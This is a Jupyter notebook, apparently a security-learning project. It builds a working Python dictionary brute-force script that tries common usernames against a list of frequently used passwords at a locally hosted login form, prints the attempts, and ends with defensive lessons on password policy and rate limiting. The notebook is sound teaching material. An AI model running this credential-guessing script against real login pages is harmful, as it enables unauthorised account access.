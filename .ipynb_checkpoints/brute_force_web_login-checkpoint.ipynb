{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "1e69a7e0-25af-4a47-9b63-4976a8f6e478",
   "metadata": {},
   "source": [
    "# Simple Dictionary-based Login Attack\n",
    "\n",
    "In this project, I’ve created a Python script that demonstrates a basic dictionary-based login attack against a web application running on `http://127.0.0.1:5000`. The script tries to guess valid credentials by iterating through a set of usernames and testing them against a large password dictionary. The script looks for a success message in the server’s response to determine if the credentials are valid.\n",
    "\n",
    "The steps I took to build out this project are as follows:<br>\n",
    "Step 1: Import Required Modules<br>\n",
    "Step 2: Define Variables<br>\n",
    "Step 3: Attempt Username and Password Combinations<br>\n",
    "Step 4: Send POST Requests<br>\n",
    "Step 5: Checking For Success<br>\n",
    "Step 6: If No Matches Found<br>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "702a26d0-c145-4c56-a3bc-58bf3db11376",
   "metadata": {},
   "source": [
    "# Step 1: Import required modules\n",
    "\n",
    "Before anything else, I needed to import the necessary libraries. I’m using `requests` to send HTTP requests and `sys` to write progress messages to the terminal without adding extra newlines (which is key for a smoother experience when testing multiple combinations).\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "b4fbb4b9-d704-4a69-abd2-f9b3e797859b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import sys"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e79038d3-6836-4afb-85b8-765e3bde9299",
   "metadata": {},
   "source": [
    "# Step 2: Define variables\n",
    "\n",
    "Here, I define a few key variables:\n",
    "\n",
    "target: The URL of the web application that I’m testing (in this case, running locally on http://127.0.0.1:5000).\n",
    "\n",
    "usernames: A small list of usernames to test. It includes common ones like admin, user, and test. This is where an attacker would often start—by guessing known usernames.\n",
    "\n",
    "passwords: This is the path to the password file I’ll be using, which contains a list of commonly used passwords. The file in question is called 1K-most-used-passwords-NCSC.txt.\n",
    "\n",
    "needle: The string I’m looking for in the server's response body to determine if the login was successful. In this case, it's \"Welcome back\", a phrase the server will send if the login is successful."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "6a1da058-6e0f-4564-995a-a5eac9e3b2b6",
   "metadata": {},
   "outputs": [],
   "source": [
    "target = \"http://127.0.0.1:5000\"\n",
    "usernames = [\"admin\", \"user\", \"test\"]\n",
    "passwords = \"1K-most-used-passwords-NCSC.txt\"\n",
    "needle = \"Welcome back\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d37ccdb9-559d-4df1-ab9b-b34a01dc83bd",
   "metadata": {},
   "source": [
    "# Step 3: Attempt username and password combinations\n",
    "\n",
    "I use two nested loops:\n",
    "\n",
    "The outer loop iterates over the list of usernames.\n",
    "\n",
    "The inner loop opens the password file (1K-most-used-passwords-NCSC.txt) and goes through each password in the list.\n",
    "\n",
    "For each password, I strip the newline character and encode it (so it can be sent as form data in the POST request). This step ensures I’m ready to send each (username, password) pair as a POST request."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "44ec156a-ebfc-4e8a-baa8-555d15795a4f",
   "metadata": {},
   "outputs": [],
   "source": [
    "for username in usernames:\n",
    "    with open(passwords, \"r\") as passwords_list:\n",
    "        for password in passwords_list:\n",
    "            password = password.strip(\"\\n\").encode()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6bf5d6e9-ce63-406d-bb40-57a1019c695e",
   "metadata": {},
   "source": [
    "# Step 4: Send POST Requests\n",
    "\n",
    "Now it’s time to send the actual requests. For every (username, password) combination, I use requests.post() to send a POST request to the server with the username and password as form data. I also print the progress on the same line (overwriting the previous output) to keep track of which combination is being tested. This is done using sys.stdout.write and \\r to overwrite the line, which is more efficient than using print()."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "a4163e8d-3939-4bd7-a198-cb444dbf55d7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[X] Attempting user: password -> test : fuckyou!\r"
     ]
    }
   ],
   "source": [
    "sys.stdout.write(f\"[X] Attempting user: password -> {username} : {password.decode()}\\r\")\n",
    "sys.stdout.flush()\n",
    "r = requests.post(target, \n",
    "                data = {\"username\" : username, \"password\" : password})\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d179308c-758a-49aa-81e6-c0b75cc4d751",
   "metadata": {},
   "source": [
    "# Step 5: Checking for Success\n",
    "\n",
    "Once the POST request is made, the script checks if the server’s response contains the needle (which is the success phrase \"Welcome back\"). If it finds the phrase, the credentials are valid! At that point, the script prints a success message and exits immediately using sys.exit(), stopping further attempts. This prevents it from testing additional passwords once a valid combination is found."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "5d0cd220-33dc-4653-8c70-a444d236e42d",
   "metadata": {},
   "outputs": [],
   "source": [
    "if needle.encode() in r.content:\n",
    "    sys.stdout.write(\"\\n\")\n",
    "    sys.stdout.write(f\"\\t[>>>>>>] Valid password {password.decode()} found for user {username}\")\n",
    "    sys.exit()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8eb1983b-276c-4ca5-855b-259f0c5e3076",
   "metadata": {},
   "source": [
    "# Step 6: If No Matches\n",
    "\n",
    "If none of the passwords in the list work for a given username, the script will print a message saying that no valid password was found for that username, and then move on to the next username. This lets me know which usernames still need to be tested."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "4c6192cf-e412-4dcc-9753-d3a86e379108",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\tNo password found for test."
     ]
    },
    {
     "data": {
      "text/plain": [
       "28"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sys.stdout.flush()\n",
    "sys.stdout.write(\"\\n\")\n",
    "sys.stdout.write(f\"\\tNo password found for {username}.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0a92b653-ffa5-4456-b631-417d102df151",
   "metadata": {},
   "source": [
    "# Lessons Learned\n",
    "\n",
    "Here are some key takeaways from this project:\n",
    "\n",
    "How an attacker operates: This script demonstrates a basic dictionary attack where an attacker tries to guess credentials by cycling through common usernames and passwords.\n",
    "\n",
    "The importance of strong passwords: This exercise highlights why robust password policies, like requiring complex passwords, are critical for security.\n",
    "\n",
    "Rate-limiting and account lockouts: To defend against such attacks, rate-limiting and account lockouts are essential. They prevent brute-force attacks from being effective.\n",
    "\n",
    "Smoother progress feedback: Using sys.stdout.write and overwriting the line makes the progress smoother than standard print statements. It’s useful in scenarios like this when trying many combinations quickly."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1fadebcb-e44e-4436-b1c6-8d0f70dc48f9",
   "metadata": {},
   "source": [
    "# Full Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "f84e9f5d-43ac-4fa0-aed3-c12e63d5b6a0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[X] Attempting user: password -> admin : fuckyou!ryxcgE\n",
      "[X] Attempting user: password -> user : fuckyou!ryxcgEword -> user : 123456\n",
      "[X] Attempting user: password -> test : fuckyou!ryxcgEord -> test : 123456\n",
      "\tNo password found for test."
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import sys\n",
    "\n",
    "target = \"http://127.0.0.1:5000\"\n",
    "usernames = [\"admin\", \"user\", \"test\"]\n",
    "passwords = \"1K-most-used-passwords-NCSC.txt\"\n",
    "needle = \"Welcome back\"\n",
    "\n",
    "for username in usernames:\n",
    "    with open(passwords, \"r\") as passwords_list:\n",
    "        for password in passwords_list:\n",
    "            password = password.strip(\"\\n\").encode()\n",
    "            sys.stdout.write(f\"[X] Attempting user: password -> {username} : {password.decode()}\\r\")\n",
    "            sys.stdout.flush()\n",
    "            r = requests.post(target, \n",
    "                            data = {\"username\" : username, \"password\" : password})\n",
    "            if needle.encode() in r.content:\n",
    "                sys.stdout.write(\"\\n\")\n",
    "                sys.stdout.write(f\"\\t[>>>>>>] Valid password {password.decode()} found for user {username}\")\n",
    "                sys.exit()\n",
    "        sys.stdout.flush()\n",
    "        sys.stdout.write(\"\\n\")\n",
    "        sys.stdout.write(f\"\\tNo password found for {username}.\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
